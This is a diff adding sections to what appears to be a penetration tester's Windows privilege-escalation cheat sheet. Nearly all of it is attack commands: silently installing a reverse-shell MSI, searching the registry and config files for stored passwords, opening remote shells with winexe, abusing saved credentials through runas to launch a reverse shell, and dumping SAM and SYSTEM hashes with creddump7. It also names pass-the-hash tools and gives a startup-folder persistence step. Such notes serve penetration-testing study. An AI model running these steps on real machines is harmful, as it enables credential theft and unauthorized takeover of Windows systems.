@@ -55,18 +55,40 @@ MANUALLY VERIFY: reg query [registry].
 CREATE REVERSE MSI FILE.
 RUN MSI: msiexec /quiet /qn /i /reverseshell.msi
 
-#################################### PASSWORDS #####################################################
+#################################### PASSWORDS ##################################################################
 reg query HKLM /f password /t REG_SZ /s = local machine
 reg query HKCU /f password /t REG_SZ /s = local user
 
+FROM LINUX: winexe -U 'user%password' //[IP] cmd.exe, winexe -U 'user%password' --system //[IP] cmd.exe
 
+#################################### SAVES CREDS ################################################################
+WINPEAS: ./winpeasany.exe quiet cmd windowscreds
+VERIFY: cmdkey /list
+EXPLOITATION: runas /savecred /user:admin C:\reverseshell.exe
 
+#################################### CONFIGURATION FILES ########################################################
+Recursively search for files in the current directory with "pass" in the name, or ending in ".config": dir /s *pass* == *.config
+Resursively search for files in the current directory that contain the word "password" and also end in either .xml, .ini, or .txt: findstr /si password *.xml *ini *.txt
+WINPEAS: .\winpeasany.exe quiet cmd searchfast filesinfo.
+INTERESTING FILES: Unattend.xml
 
+#################################### SAM ########################################################################
+Windows stores password hashes in the Security Account Manager. The hashes are encrypted with a key which can be found in a file names SYSTEM.
+If we have the ability to read the SAM and SYSTEM files, we can extract the hashes.
+The SAM and SYSTEM files are located in the C:\Windows\System32\config directory. Yhe files are locked while Windows is running.
+Backups may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories.
+CREDDUMP7: https://github.com/CiscoCXSecurity/creddump7.git
+CREDDUMP7 USAGE: python2 pwdump.py /SYSTEM /SAM (LM hash deprecated, NTLM hash which starts with 31d6 = empty string or disabled).
 
+#################################### PASS THE HASH ##############################################################
+pth-winexe, evil-winrm, psexec, wmiexec, crackmapexec.
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+STARTUP APPS
 
-
-
+.\accescheck.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Start"
+CREATE VBS script.
+RUN SCRIPT: cscript [script name].
 
 
 
